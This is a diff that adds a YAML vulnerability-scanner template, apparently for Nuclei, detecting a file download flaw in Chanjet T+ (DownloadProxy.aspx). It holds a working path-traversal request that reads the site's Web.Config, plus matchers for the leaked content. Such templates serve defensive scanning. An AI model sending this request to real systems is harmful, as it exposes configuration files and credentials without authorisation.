@@ -1,0 +1,26 @@
+id: yonyou-chanjet-tplus-downloadproxy-filedownload
+
+info:
+  name: "畅捷通-TPlus DownloadProxy.aspx 文件下载漏洞"
+  author: hufei
+  severity: high
+  tags: 畅捷通-TPlus
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SYSTEMDB"
+          - "ProductInfo"
+          - "<?xml"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
